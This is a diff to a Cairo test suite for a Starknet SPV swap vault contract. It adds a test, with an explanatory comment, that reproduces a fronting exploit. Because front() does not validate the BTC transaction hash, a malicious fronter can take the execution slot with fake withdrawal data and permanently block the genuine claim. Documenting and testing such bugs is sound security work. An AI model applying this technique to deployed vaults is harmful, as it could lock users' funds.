@@ -1,12 +1,13 @@
+use spv_swap_vault::utils::U32ArrayToU256ParserTrait;
 use starknet::contract_address::{ContractAddress, contract_address_const};
 
-use spv_swap_vault::structs::{BitcoinVaultTransactionDataImpl};
+use spv_swap_vault::structs::{BitcoinVaultTransactionDataImpl, BitcoinVaultTransactionData};
 
 use btc_utils::bitcoin_tx::BitcoinTransactionTrait;
 
 use crate::utils::contract::{Context, get_context};
 use crate::utils::btc_relay::get_btc_relay_with_txs;
-use crate::utils::spv_vault::{get_funded_spv_vault, mint_and_front, claim_and_assert};
+use crate::utils::spv_vault::{get_funded_spv_vault, mint_and_front, claim_and_assert, front_and_assert};
 use crate::utils::btc_tx::{get_valid_tx, get_btc_tx};
 
 fn test_create_and_claim(
@@ -994,6 +995,70 @@ fn close_withdraw_too_much_token1() {
     get_funded_spv_vault(context, owner, vault_id, relay_contract, utxo, confirmations, token_0_multiplier, token_1_multiplier, raw_amount_0, raw_amount_1);
 
     let res = claim_and_assert(context, fronter, owner, recipient, vault_id, token_0_multiplier, token_1_multiplier, @raw_tx, blockheader, array![].span(), 0, 'withdraw: amount 1');
+    if res.is_err() {
+        panic(array![res.unwrap_err()]);
+    }
+}
+
+//Possible exploit on the spv vault, where a malicious fronter pre-occupies the execution contract's slot
+// of the actual genuine withdrawal request. This is possible because the front() function doesn't check
+// whether the provided btc tx hash is correct or not, but instead just takes the provided withdrawal data
+// from the fronter, this is fine for the sake of fronting, as the withdrawal data are hashed, but
+// for execution salt, only the btc tx hash is taken into account.
+#[test]
+fn exploit_malicous_claim_execution_fronting() {
+    let context: Context = get_context();
+    let owner: ContractAddress = contract_address_const::<'owner'>();
+    let utxo: (u256, u32) = (1, 1);
+    let confirmations: u8 = 3;
+    let token_0_multiplier: felt252 = 643523;
+    let token_1_multiplier: felt252 = 5322;
+    let raw_amount_0: u64 = 123123;
+    let raw_amount_1: u64 = 4848;
+
+    let fronter = contract_address_const::<'fronter'>();
+    let recipient = contract_address_const::<'recipient'>();
+    let raw_withdraw_amount_0: u64 = 48485;
+    let caller_fee_u20 = 2312;
+    let fronting_fee_u20 = 1245;
+    let execution_fee_u20 = 4484;
+    let execution_expiry = 1501454187;
+
+    let execution_hash = 0x1429125823328589345340;
+
+    let (raw_tx, btc_tx) = get_valid_tx(
+        utxo,
+        recipient.try_into().unwrap(),
+        raw_withdraw_amount_0,
+        Option::None,
+        Option::Some(execution_hash),
+        caller_fee_u20,
+        fronting_fee_u20,
+        execution_fee_u20,
+        execution_expiry
+    );
+    let btc_tx_hash = btc_tx.get_hash();
+
+    let (blockheader, relay_contract) = get_btc_relay_with_txs(array![btc_tx_hash].span(), 3);
+
+    get_funded_spv_vault(context, owner, 0, relay_contract, utxo, confirmations, token_0_multiplier, token_1_multiplier, raw_amount_0, raw_amount_1);
+
+    let malicious_tx_data_for_fronting = BitcoinVaultTransactionData {
+        recipient: recipient,
+        amount: (0, 0),
+        caller_fee: (0, 0),
+        fronting_fee: (0, 0),
+        execution_handler_fee_amount_0: 0,
+        execution_hash: 0x1, //This might use a different execution hash even
+        execution_expiry: 100
+    };
+    
+    //Front with the malicious data, which still includes the same execution_hash
+    front_and_assert(context, fronter, owner, 0, token_0_multiplier, token_1_multiplier, 0, btc_tx_hash.to_u256(), malicious_tx_data_for_fronting);
+
+    //Now the claim should fail! Effectively blocking the vault forever
+    let res = claim_and_assert(context, 0.try_into().unwrap(), owner, recipient, 0, token_0_multiplier, token_1_multiplier, @raw_tx, blockheader, array![].span(), 0, 0);
+
     if res.is_err() {
         panic(array![res.unwrap_err()]);
     }
